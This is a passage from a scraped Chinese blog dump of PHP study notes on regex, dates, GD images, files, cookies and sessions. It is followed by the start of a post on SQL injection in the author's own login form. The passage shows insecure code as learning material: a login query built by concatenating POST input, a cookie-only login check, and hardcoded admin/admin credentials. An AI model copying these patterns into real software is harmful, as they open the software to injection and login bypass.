表示其前面的字符至少出现n次，最多出现m次 ^或\\A 匹配字符串开始位置 $或者\\Z 匹配字符串的结束位置//^与$配合使用：$a=&#39;/^test$/&#39;; | 匹配两个或多个模式//$a=&#39;/test|abc/&#39;; [] 匹配方括号中的任意一个字符//$a=&#39;/t[eabcd]st/&#39;; [^] 匹配除方括号中字符以外的任意一个字符/$a=&#39;/t[^e]st/&#39;; () 将括号中作为一个整体以便将其中的内容获取到 在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可以使用 \\\\数字 来代表圆括号部分所匹配到的内容！ 例：$a=&#39;/t(e)st\\\\1/&#39;;//除了匹配字符串test，还匹配到了字符e。\\\\1代表第一个圆括号所匹配到的内容‘/teste/’ $str=&#39; test &#39;; 5、模式修正符 常见模式修正符i 在和模式进行匹配时不区分大小写 例：$a=&#39;/test/i&#39;; m 多行匹配，如果目标字符串 中没有”\\n”字符, 或者模式中没有出现^或$, 设置这个修饰符不产生任何影响 使用条件： (1)目标字符串中必须包含“\\n” (2)正则表达式中必须要出现^或$ 模式修正符m的作用：多行匹配 例： $pattern=&#39;/test$/m&#39;; $str=&quot;test\\ntest\\n&quot;; $pattern=&#39;/test\\r*$/m&#39;; $str=&quot;test test test&quot;;//最后一个匹配不到，所以加* //在windows操作系统中所看到的换行(现象),其实是通过两个字符来完成的(\\r\\n) //在Linux操作系统中所看到的换行(现象),其实是通过(\\n)来完成的 s 如果设定了此修正符，那么.将匹配所有的字符包括换行符 例： $pattern=&#39;/t.st/s&#39;; $str=&quot;t\\st&quot;//可以匹配到“\\” U 禁止贪婪匹配 例： $pattern=&#39;/a.*f/U&#39;;//等价于$pattern=&#39;/a.*?f/&#39;; $str=&quot; adwqfsav avsfaf&quot;; 模式修正符是可以多个搭配使用的 6、与正则表达式配合的函数 常用： preg_match_all — 执行一个全局正则表达式匹配 参数说明： 第四个参数（可选）：PREG_PATTERN_ORDERPREG_SET_ORDERPREG_OFFSET_CAPTURE第五个参数(可选):可以传一个值,来表示从目标字符串的哪个位置开始搜索(单位是字节) $pattern=&#39;/a.*f/U&#39;;//等价于$pattern=&#39;/a.*?f/&#39;; $str=&quot; adwqfsav avsfaf&quot;; var_dump(preg_match_all($pattern,$str,$arr)); var_dump($arr); preg_match — 执行匹配正则表达式 匹配一次就结束，匹配不到返回0 参数说明：第一个参数:正则表达式第二个参数：目标字符串第三个参数(可选):放一个变量，执行完成之后，里面会有匹配到的部分以及等等一些数据！第四个参数(可选):可以传PREG_OFFSET_CAPTURE进入(那么第三个参数那个变量里面的数据就会有匹配到的部分的偏移值)，默认传的是0第五个参数(可选):可以传一个值,来表示从目标字符串的哪个位置开始搜索（单位是字节） $pattern=&#39;/a.*f/U&#39;;//等价于$pattern=&#39;/a.*?f/&#39;; $str=&quot; adwqfsav avsfaf&quot;; var_dump(preg_match($pattern,$str,$arr,PREG_OFFSET_CAPTURE)); var_dump($arr); preg_replace — 执行一个正则表达式的搜索和替换 参数说明：第一个参数：正则表达式第二个参数：要替换成的字符串第三个参数：目标字符串第四个参数(可选)：默认是-1，就是替换所有符合特征部分的！第五个参数(可选):你可以放一个变量在这边 $pattern=&#39;/&lt;div(.*?)&gt;(.*?)&lt;\\/div&gt;/&#39;; $str1=&#39;&lt;a$1 href=&quot;http://www.baidu.com&quot;&gt;$2&lt;/a&gt;&#39;; $str=&#39;dwqdwq&lt;div style=&quot;color:red;font-size:25px;&quot;&gt;测试成为绯闻绯闻绯闻绯dwqdwqdwq闻cqdwqdqw&lt;/div&gt;dqwwdqdwq&lt;div&gt;我是后面那个div&lt;/div&gt;&#39;; if(preg_match($pattern, $str,$arr)){ echo &#39;替换后的：&#39;.preg_replace($pattern, $str1, $str,-1,$count); var_dump($count); }else{ echo &#39;对不起，没有找到！&#39;; } echo &#39;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&#39;; echo &#39;原来的字符串：&#39;.$str; 传数组 //preg_replace第一个参数与第二个参数传数组，一一对应的去替换！ $pattern=array( &#39;/&lt;div(.*?)&gt;(.*?)&lt;\\/div&gt;/&#39;, &#39;/&lt;p(.*?)&gt;(.*?)&lt;\\/p&gt;/&#39; ); $str1=array( &#39;&lt;a$1 href=&quot;http://sifangku.com&quot;&gt;$2&lt;/a&gt;&#39;, &#39;&lt;span$1&gt;我是span标签啦！$2&lt;/span&gt;&#39; ); $str=&#39;dwqdwq&lt;div style=&quot;color:red;font-size:25px;&quot;&gt;测试成为绯闻绯闻绯闻绯dwqdwqdwq闻cqdwqdqw&lt;/div&gt;dqwwdqdwq&lt;p&gt;我是后面那个div&lt;/p&gt;&#39;; echo &#39;替换后的：&#39;.preg_replace($pattern, $str1, $str,-1,$count); var_dump($count); echo &#39;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&#39;; echo &#39;原来的字符串：&#39;.$str; 其他字符串函数： preg_filter — 执行一个正则表达式搜索和替换 preg_grep — 返回匹配模式的数组条目 preg_last_error — 返回最后一个PCRE正则执行产生的错误代码 preg_match_all — 执行一个全局正则表达式匹配 preg_match — 执行匹配正则表达式 preg_quote — 转义正则表达式字符 preg_replace_callback_array — Perform a regular expression search and replace using callbacks preg_replace_callback — 执行一个正则表达式搜索并且使用一个回调进行替换 preg_replace — 执行一个正则表达式的搜索和替换 preg_split — 通过一个正则表达式分隔字符串 二、日期与时间1、设置时区 date_default_timezone_set(&#39;Asia/Shanghai&#39;);//设置时区 2、获取当前Unix时间戳 Unix时间戳：从Unix纪元(格林威治时间1970年1月1日00时00分00秒)开始到当前的秒数 time() 3、获取指定时间的Unix时间戳 //mktime() date_default_timezone_set(&#39;Asia/Shanghai&#39;);//设置时区 $nowTime=time(); $time1=mktime(0,0,0,10,1,2014);//取得一个日期的 Unix 时间戳 echo &#39;距离2014年国庆还有&#39;.(($time1-$nowTime)/60/60/24).&#39;天&#39;; 4、从Unix时间戳取得时间日期信息date()格式化一个本地时间／日期第一个参数:必填,写上你所需要的时间日期的格式,把format 字符放在第一个参数里面会被转换成对应的信息,其他的字符还是原来的样子 date(&#39;Y-m-d G:i:s&#39;)//Y:年 m:月 d:日 G:时 i:分 s:秒 自定义格式化Unix时间戳 为指定的时间格式。可以查询php使用手册：date()5、获取Unix时间戳和微秒数 microtime() 返回当前 Unix 时间戳和微秒数 var_dump(microtime()); var_dump(microtime(true));//返回一个浮点数 round()//指定精度`如：round($a,4)//四舍五入$a,保留4位小数 三、图像处理学前需要了解：在PHP中可以通过GD库处理图像(php的扩展库)创建一个图像应该完成如下所示的四个基本步骤：1.创建图像 1.创建新的 imagecreatetruecolor()//新建一个真彩色图像 2.打开服务器或网络文件中已经存在的GIF,JPEG,PNG,WBMP格式图像 imagecreatefromjpeg() imagecreatefrompng() imagecreatefromgif() imagecreatefromwbmp() 创建或者打开失败的时候会返回空字符串，并且输出一条错误信息。 imagesx()//输出画布宽度 imagesy()//输出画布高度 getimagesize()//取得图像大小 2.绘制图像 图像创建完成以后，就可以通过这个图像资源，使用各种画像函数设置图像的颜色、填充图像、画点、线段、以及向图像的添加文本等 1.imagecolorallocate()//分配颜色 2.imagefill()//区域填充 3.imagesetpixel()//画一个单一像素 4.imageline()//画一条线段 5.imagerectangle()//画一个矩形 6.imagestring()//水平地画一行字符串 7.imagettftext()//用 TrueType 字体向图像写入文本 8.imagettfbbox()//计算 TrueType 文字所占区域 9.imagecopy()//拷贝图像的一部分 10.imagecopymerge()//拷贝并合并图像的一部分 11.imagecopyresampled()//重采样拷贝部分图像并调整大小 3.输出图像 header(&#39;Content-type:image/jpeg&#39;);//输出图像为jpeg时 ​ header函数注意点​ 在该函数之前，不能输出任何内容​ 在我们的PHP代码 的函数里面，我们使用的/开头的路径 这个/不是指 web根目录,而是操作系统的 文件的根目录!4.释放资源 设计验证码的步骤： 水印 缩放与裁剪 imagecopyresampled()函数 采样某个图像资源的 某一部分 到 另外一个图像资源上面去 例1(jpeg图像)： header(&#39;Content-type:text/html;charset:utf-8&#39;);//设置编码 header(&#39;Content-type:image/jpeg&#39;);//输出图像为jpeg时 $img=imagecreatetruecolor(200,100);//新建一个宽200高100的真彩色图像 $color1=imagecolorallocate($img,20,40,255);//分配颜色,采用RGB格式 $color2=imagecolorallocate($img,70,80,90); imagefill($img,0,0,$color1);//区域填充,从左上角0，0处进行填充 imagejpeg($img);//输出图像为jpeg格式 /*if(imagejpeg($img,&#39;1.jpeg&#39;)){ echo &#39;保存成功&#39;; }//加参数是保存图像,可以写相对路径*/ imagecopyresampled($img);//释放资源 例2(验证码)： header(&#39;Content-type:text/html;charset:utf-8&#39;);//设置编码 header(&#39;Content-type:image/jpeg&#39;);//输出图像为jpeg时 $width=120;//图像宽 $height=40;//图像高 $element=array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;);//字符串所包含字符 $string=&#39;&#39;;//初始化字符 for ($i=0;$i&lt;5;$i++){//字符串字符个数 $string.=$element[rand(0,count($element)-1)];//每次在$element随机选择字符并赋给$string } $img=imagecreatetruecolor($width, $height);//创建图像 $colorBg=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//背景颜色，RGB格式，且RGB在200到255随机 $colorBorder=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//边框颜色，RGB格式，且RGB在200到255随机 $colorString=imagecolorallocate($img,rand(10,100),rand(10,100),rand(10,100));//字符串颜色，RGB格式，且RGB在10到100随机 imagefill($img,0,0,$colorBg);//区域填充 imagerectangle($img,0,0,$width-1,$height-1,$colorBorder);//画一个宽为119，高为39的矩形。并显示边框颜色 for($i=0;$i&lt;100;$i++){//画了100个点，并在矩形里随机分布。点的颜色，RGB格式，且RGB在100到200随机 imagesetpixel($img,rand(0,$width-1),rand(0,$height-1),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200))); } for($i=0;$i&lt;3;$i++){//画了3条线 imageline($img,rand(0,$width/2),rand(0,$height),rand($width/2,$width),rand(0,$height),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200))); } //imagestring($img,5,0,0,&#39;abcd&#39;,$colorString);//不太常用，一般用下面这种方式 imagettftext($img,19,rand(-5,5),rand(5,15),rand(30,35),$colorString,&#39;font/Inkfree.ttf&#39;,$string); //19是字体大小 rand(-5,5)是偏转角度从-5到5的随机角度 rand(5,15)和rand(30,35)是宽和高的范围 $colorString是字体颜色 &#39;font/Inkfree.ttf&#39;是使用字体样式的路径 $string是字符串 imagejpeg($img);//输出图像 imagedestroy($img);//释放资源 例3(文字水印)： header(&#39;Content-type:text/html;charset:utf-8&#39;);//设置编码 header(&#39;Content-type:image/jpeg&#39;);//输出图像为jpeg时 $img=imagecreatefromjpeg(&#39;images/1.jpg&#39;);//打开images文件下的1.jpg图片(也可以打开浏览器上的图片，写图片地址) $color=imagecolorallocate($img,255,255,255);//颜色 $width=imagesx($img);//取得图像宽度 $height=imagesy($img);//取得图像高度 $position=imagettfbbox(20,0,&#39;font/Inkfree.TTF&#39;,&#39;qwzf&#39;); $stringWidth=$position[2]-$position[0];//水印宽度 imagettftext($img,20,0,$width-1-$stringWidth-($width/30),$height-1-($height/30), $color,&#39;font/Inkfree.TTF&#39;,&#39;qwzf&#39;); //$width-1-$stringWidth-($width/30),$height-1-($height/30)把水印放在右下角 imagejpeg($img);//输出图像 imagedestroy($img);//释放资源 例4(图片水印)： header(&#39;Content-type:image/jpeg&#39;); $img=imagecreatefromjpeg(&#39;images/zcx.jpg&#39;); $waterMark=imagecreatefromgif(&#39;images/watermark.gif&#39;); $color=imagecolorallocate($img,255,255,255); $width=imagesx($img); $height=imagesy($img); $waterMarkWidth=imagesx($waterMark); $waterMarkHeight=imagesy($waterMark); $position=imagettfbbox(20,0,&#39;font/Inkfree.TTF&#39;,&#39;qwzf&#39;); $stringWidth=$position[2]-$position[0]; //文字水印 //imagettftext($img,20,0,$width-1-$stringWidth-($width/30),$height-1-($height/30), $color,&#39;font/china1.TTF&#39;,&#39;小刚/周传雄&#39;); /* imagecopy($img,$waterMark,100,100,0,0,$waterMarkWidth,$waterMarkHeight); 参数说明： $img:目标图像资源 $waterMark:水印的图像资源 100:所要拷贝到目标图像资源上面的坐标(x轴位置) 100:所要拷贝到目标图像资源上面的坐标(y轴位置) 0:从水印的图像资源的x坐标为0的位置开始拷贝 0:从水印的图像资源的y坐标为0的位置开始拷贝 $waterMarkWidth:所要拷贝的水印图像的长度 $waterMarkHeight:所要拷贝的水印图像的高度 */ imagecopy($img,$waterMark,$width-1-$waterMarkWidth,$height-1-$waterMarkHeight,0,0,$waterMarkWidth,$waterMarkHeight); imagejpeg($img); imagedestroy($img); 例4(裁剪和收缩)： //等比例缩放(裁剪) header(&#39;Content-type:image/jpeg&#39;); $img=imagecreatefromjpeg(&#39;images/zcx.jpg&#39;); $imgWidth=imagesx($img); $imgHeight=imagesy($img); $height=$width/($imgWidth/$imgHeight); $img1=imagecreatetruecolor($width,$height); /* imagecopyresampled($dst_image, $src_image, $dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h) 参数说明： $dst_image:目标图像资源 $src_image:源图像资源（你要采样的那个图像资源） $dst_x: $dst_y:与上面的$dst_x确定了一个坐标,把采样到的部分 放到目标图像资源的什么位置 $src_x: $src_y:与上面的$src_y确定了一个坐标,你要采样的原图像资源的 某个部分的起始坐标 $dst_w: $dst_h:与上面的$dst_w确定了 放到目标图像资源上面的尺寸 $src_w: $src_h:与上面的$src_w确定了 采样原图像资源的 某个部分 */ imagecopyresampled($img1,$img,0,0,0,0,$width,$height,$imgWidth,$imgHeight); //裁剪 //imagecopyresampled($img1,$img,0,0,0,0,100,100,100,100); if(imagejpeg($img1)){ imagejpeg($img1,&#39;images/zoom_zcx.jpg&#39;); } imagedestroy($img); imagedestroy($img1); 四、文件与目录操作任何数据类型变量所存储的数据，都是在程序运行时才加载到内存中，而不能持久保存，那么如果需要将数据长久的保存起来，主要有两种办法，保存到普通文件中或者保存到数据库中。PHP可以在服务器上生成目录，创建、编辑、删除、修改文件属性等操作 1、判断普通文件和目录 1.is_file()//判断给定文件名是否为一个正常的文件(如：文件) 2.is_dir()//判断给定文件名是否是一个目录(如：文件夹) 2、文件的属性 1.file_exists()//检查文件或目录是否存在 2.filesize()//取得普通文件大小(字节) 3.is_readable()//判断给定文件名是否可读 4.is_writable()//判断给定的文件名是否可写 5.filectime()//获取文件的创建时间 6.filemtime()//获取文件的修改时间 7.fileatime()//取得文件的上次访问时间 8.stat()//获取文件大部分属性值 3、目录的基本操作 1.basename()//返回路径中的文件名部分 2.dirname()//返回路径中的目录部分 3.pathinfo()//返回文件路径的信息 4.opendir()//打开目录句柄 5.readdir()//从目录句柄中读取条目,返回目录中下一个文件的文件名 6.rewinddir()//倒回目录句柄 7.closedir()//关闭目录句柄 8.mkdir()//新建目录 9.rmdir()//删除指定的空目录 10.scandir()//列出指定路径中的文件和目录 4、文件的基本操作 1.fopen()//打开文件或者 URL r只读 r+读写 2.fread()//读取文件 3.fgets()//从文件指针中读取一行 4.feof()//测试文件指针是否到了文件结束的位置 5.fwrite()//写入文件，返回写入的字节数 6.rewind()//倒回文件指针的位置 7.flock()//轻便的咨询文件锁定 8.ftruncate()//将文件截断到给定的长度 9.fclose()//关闭一个已打开的文件指针 10.file() //把整个文件读入一个数组中 11.copy()//拷贝文件 12.unlink()//删除文件 13.file_get_contents()//将整个文件读入一个字符串 14.file_put_contents()//将字符串写入文件中 15.rename()//重命名一个文件或目录 16.readfile()//读入一个文件并写入到输出缓冲 例： $file=fopen(&#39;1.txt&#39;,&#39;r&#39;);//打开1.txt文件，只读 var_dump(fread($file,2));//读取两个字节 var_dump(fgets($file));//读一行 5、文件的上传文件的上传的过程这些细节是不需要管的，都是自动的，上传的文件默认是放在一个临时的目录里面的，我们要做的就是把这些临时目录里面的文件移动到我们需要的地方 1.html标签需要做的上传设置 (1) form标签属性设置 ​ &lt;1&gt;method设置为post ​ &lt;2&gt;enctype设置为multipart/form-data ​ &lt;3&gt;form表单中设置隐藏类型的input,其中name值设置为MAX_FILE_SIZE,VALUE值设置为需要限制的上传文件的大小(单位为字节) 2.在服务器端通过PHP处理上传文件，涉及到下面的几条信息 (1)与上传有关的 php配置选项(php.ini) ​ 配置项 可能值 功能描述 file_uploads ON 确定服务器上的PHP脚本是否可以接受HTTP文件上传 memory_limit 8M 设置脚本可以分配的最大内存量，防止失控的脚本独占服务器内存 upload_max_filesize 2M 限制PHP处理上传文件的最大值，此值必须小于post_max_size值 post_max_size 8M 限制通过POST方法可以接受的信息最大量 upload_tmp_dir F:/wamp/tmp 上传文件存放的临时路径，可以是一个绝对路径。这个目录对于拥有此服务器进程用户必须是可写的。(2)$_FILES多维数组：用于存储各种与上传有关的信息 ​ $_FILES[&#39;file&#39;][&#39;name&#39;] 客户端机器文件的原名称，包含扩展名 ​ $_FILES[&#39;file&#39;][&#39;size&#39;] 已上传文件的大小，单位为字节 ​ $_FILES[&#39;file&#39;][&#39;tmp_name&#39;] 文件上传之后，在服务器端存储的临时文件名 ​ $_FILES[&#39;file&#39;][&#39;error&#39;] 文件上传时产生的错误 ​ 0：表示没有发生任何错误，文件上传成功 ​ 1：表示上传文件的大小超出了再PHP配置文件中upload_max_filesize选项限制的值 ​ 2：表示上传文件大小超出了HTML表单中MAX_FILE_SIZE选项所指定的值 ​ 3：表示文件只被部分上传 ​ 4：表示没有上传任何文件 ​ $_FILES[&#39;file&#39;][&#39;type&#39;] 获取客户端上传文件的MIME类型，MIME类型规定了各种文件格式的类型。每种MIME类型都是由/分隔的主类型和子类型组成 (3)PHP的文件上传处理函数：用于上传文件的后续处理 ​ &lt;1&gt;is_uploaded_file()判断指定的文件是否通过HTTP POST上传的 ​ &lt;2&gt;move_uploaded_file()文件上传后，首先会存储于服务器的临时目录中，可以使用该函数将上传的文件移动到新位置 6、文件的下载 (1)发送指定的文件MIME类型的头信息 header(&#39;Content-type:MIME类型&#39;); (2)指定下载文件的描述 header(&#39;Content-Disposition:attachement;filename=文件名称&#39;); (3)指定下载文件的大小 header(&#39;Content-Length:文件大小&#39;); (4)读取文件内容至输出缓冲区 readfile(); ​ 获取文件的MIME类型：http://localhost/php/index.php就相当于：localhost/php/a.rar 五、会话控制1、cookie的设置、读取与删除 客户端电脑中设置 header(&#39;Content-type:text/html;charset=utf-8&#39;); var_dump(setcookie(&#39;username&#39;,&#39;password&#39;,time()+3600)); //var_dump(setcookie(&#39;member[username]&#39;,&#39;password&#39;,time()+3600));//将多维数组应用于Cookie中 服务器端上读取 var_dump($_COOKIE);//超全局变量，在服务器端上读取Cookie的内容 删除 header(&#39;Content-type:text/html;charset=utf-8&#39;); var_dump(setcookie(&#39;username&#39;,&#39;&#39;,time()-1));//删除Cookie /*foreach($_COOKIE[&#39;member&#39;] as $key=&gt;$val){//遍历数组删除cookie var_dump(setcookie(&#39;member[{$key}]&#39;,&#39;&#39;,time()-3600)); }*/ 注意：使用setcookie删除cookie的时候，需要与当初设置cookie的时候参数一致 2、session的开启、存储与销毁 返回一个分配好的session id 把这个id保存在客户端的cookie里面 id对应的数据都是保存在服务器端 开启 session_start(); (1)开启一个会话(2)打开已经存在的会话 根据客户端传来的session id 把这个 session id 对应的数据 读取到$_SESSION这个变量里面 存储 header(&#39;Content-type:text/html;charset=utf-8&#39;); session_start(); $_SESSION[&#39;name&#39;]=&#39;qwzf&#39;; $_SESSION[&#39;email&#39;]=&#39;1739381035@qq.com&#39;; 读取 header(&#39;Content-type:text/html;charset=utf-8&#39;); session_start();//开启会话 var_dump($_SESSION);//接收服务器端返回的数据，并输出 //var_dump($_COOKIE);//输出cookie //var_dump(session_name());//session_name()获取cookie名称 销毁 session_start();//打开要销毁的会话 session_unset();//Free all session variables销毁变量 session_destroy();//销毁一个会话中的全部数据 setcookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);//销毁保存在客户端的session id //“/”Web根目录 3、基于cookie或session的登录模块 COOKIE login.php的源代码 &lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; $_COOKIE[&#39;username&#39;]===&#39;admin&#39;) { exit(&#39;您已经登录请不要重复登录&#39;); } if(isset($_POST[&#39;submit&#39;])){ if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;]===&#39;admin&#39; &amp;&amp; $_POST[&#39;password&#39;]===&#39;admin&#39;){ if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()+3600)){ header(&#39;Location:index.php&#39;); }else{ echo &#39;cookie设置失败！&#39;; } }else{ echo &quot;您的用户名或密码输入有误，&lt;a href=login.php&gt;请重新登录！&lt;/a&gt;&quot;; } } ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;请登录&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;login.php&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt; 密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; index.php的源代码 &lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; $_COOKIE[&#39;username&#39;]===&#39;admin&#39;) { echo &quot;{$_COOKIE[&#39;username&#39;]}您好,欢迎回来！&quot;; echo &quot;&lt;a href=&#39;logout.php&#39;&gt;注销&lt;/a&gt;&quot;; }else { echo &quot;&lt;a href=&#39;login.php&#39;&gt;请登录&lt;/a&gt;&quot;; } ?&gt; logout.php的源代码 &lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; $_COOKIE[&#39;username&#39;]===&#39;admin&#39;) { if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()-3600)){ header(&#39;Location:login.html&#39;); }else{ echo &quot;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;注销失败&#39;);location=&#39;index.php&#39;;&lt;/script&gt;&quot;; } } ?&gt; SESSION login.php的源代码 &lt;?php session_start(); header(&#39;Content-type:text/html;charset=utf-8&#39;); if (isset($_SESSION[&#39;username&#39;]) &amp;&amp; $_SESSION[&#39;username&#39;]===&#39;admin&#39;) { exit(&#39;您已经登录请不要重复登录&#39;); } if(isset($_POST[&#39;submit&#39;])){ if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;]===&#39;admin&#39; &amp;&amp; $_POST[&#39;password&#39;]===&#39;admin&#39;){ $_SESSION[&#39;username&#39;]=$_POST[&#39;username&#39;]; header(&#39;Location:index.php&#39;); }else{ echo &quot;您的用户名或密码输入有误，&lt;a href=login.php&gt;请重新登录！&lt;/a&gt;&quot;; } } ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;请登录&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;login.php&quot;&gt; 姓名：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt; 密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; index.php的源代码 &lt;?php session_start(); header(&#39;Content-type:text/html;charset=utf-8&#39;); if (isset($_SESSION[&#39;username&#39;]) &amp;&amp; $_SESSION[&#39;username&#39;]===&#39;admin&#39;) { echo &quot;{$_SESSION[&#39;username&#39;]}您好,欢迎回来！&quot;; echo &quot;&lt;a href=&#39;logout.php&#39;&gt;注销&lt;/a&gt;&quot;; }else { echo &quot;&lt;a href=&#39;login.php&#39;&gt;请登录&lt;/a&gt;&quot;; } ?&gt; logout.php的源代码 &lt;?php session_start(); header(&#39;Content-type:text/html;charset=utf-8&#39;); if (isset($_SESSION[&#39;username&#39;]) &amp;&amp; $_SESSION[&#39;username&#39;]===&#39;admin&#39;) { session_unset();//Free all session variables销毁变量 session_destroy();//销毁一个会话中的全部数据 setcookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);//销毁保存在客户端的session id header(&#39;Location:login.html&#39;); }else{ echo &quot;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;注销失败&#39;);location=&#39;index.php&#39;;&lt;/script&gt;&quot;; } ?&gt; 总结完毕，总结练习过程中收获是巨多的。一起继续努力吧！小白进阶ing","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"PHP","slug":"编程开发/PHP","permalink":"https://qwzf.github.io/categories/编程开发/PHP/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://qwzf.github.io/tags/正则表达式/"},{"name":"日期和时间","slug":"日期和时间","permalink":"https://qwzf.github.io/tags/日期和时间/"},{"name":"图像处理","slug":"图像处理","permalink":"https://qwzf.github.io/tags/图像处理/"},{"name":"文件与目录操作","slug":"文件与目录操作","permalink":"https://qwzf.github.io/tags/文件与目录操作/"},{"name":"会话控制","slug":"会话控制","permalink":"https://qwzf.github.io/tags/会话控制/"}],"author":"qwzf"},{"title":"一次团队内部比赛经历","slug":"一次团队内部比赛经历","date":"2019-04-26T14:59:01.437Z","updated":"2020-08-01T16:09:32.574Z","comments":true,"path":"2019/04/26/一次团队内部比赛经历/","link":"","permalink":"https://qwzf.github.io/2019/04/26/一次团队内部比赛经历/","excerpt":"","text":"经过这次登录框被多数人打爆的经历，我反思了很多。由于当时为了快点写好登录框，没有考虑对登录框的SQL注入进行预防。在写登录框制作总结时，也发现了自己登录框存在的漏洞，但是没有去改。。。最终导致这一惨剧的发生！！！ 经过不断的修改，最终把我已知漏洞修复完毕。在这个过程中，我收获了很多，所以总结了一下。。 SQL注入介绍所谓SQL注入式攻击，就是输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。在某些表单中，用户输入的内容直接用来构造(或者影响)动态SQL命令(也就是所谓构造payload)，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击 SQL注入发生当应用程序使用输入内容来构造payload以访问数据库时，会发生sql注入攻击。 如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的 字符串来传递，也会发生sql注入。 sql注入可能导致攻击者使用应用程序登陆在数据库中执行命令。如果应用程序使用特权过高的帐户连接到数据库，这种问题会变得很严重。在某些表单中，用户输入的内容直接用来构造payload，或者作为存储过程的输入参数，这些表单特别容易受到sql注入的攻击。而许多 网站程序在编写时，没有对用户输入的合法性进行判断或者程序中本身的变量处理不当，使应用程序存在安全隐患。这样，用户就可以提交一段数据库查询的代码， 根据程序返回的结果，获得一些敏感的信息或者控制整个服务器，于是sql注入就发生了。 SQL注入的预防思路1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。 2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。 3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。 4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。 5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装 6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky,网站平台就有亿思网站安全平台检测工具 正文SQL注入漏洞首先，先看一下我的登录验证的源代码 &lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); $db = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;)//mysql_connect()建立数据库连接//localhost:连接MySQL地址//root:连接MySQL用户名//root:连接MySQL密码 or die(&quot;连接数据库失败！&quot;); mysql_select_db(&quot;demo&quot;,$db)//mysql_select_db()选择数据库，这里选择的是数据库名为demo的数据库 or die(&quot;您要选择的数据库不存在&quot;.mysql_error()); $username=$_POST[&#39;username&#39;];//用$username存放从login.html表单提交过来的username $password=$_POST[&#39;password&#39;];//用$password存放从login.html表单提交过来的password $sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;/*用$sql存放sql查询判断命令*/ $result = mysql_query($sql);//mysql_query()规定要发送的SQL查询，查询MySQL，存放于$result。注意：查询字符串不应以分号结束 $colum= mysql_fetch_array($result);//mysql_fetch_array()获取和显示数据 if(is_array($colum)){//is_array()检测变量是否是数组 if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()+3600)){//设置cookie header(&quot;Location:index.php&quot;); } else{ echo &#39;Cookie设置失败&#39;; } } else{ echo &quot;您的用户名或密码输入有误，&lt;a href=login.html&gt;请重新登录！&lt;/a&gt;&quot;; } ?&gt; 漏洞1 上面的这一部分应该放在另放到一个PHP文件，并把这个PHP文件重点保护。在登录验证时，可以使用require_once() 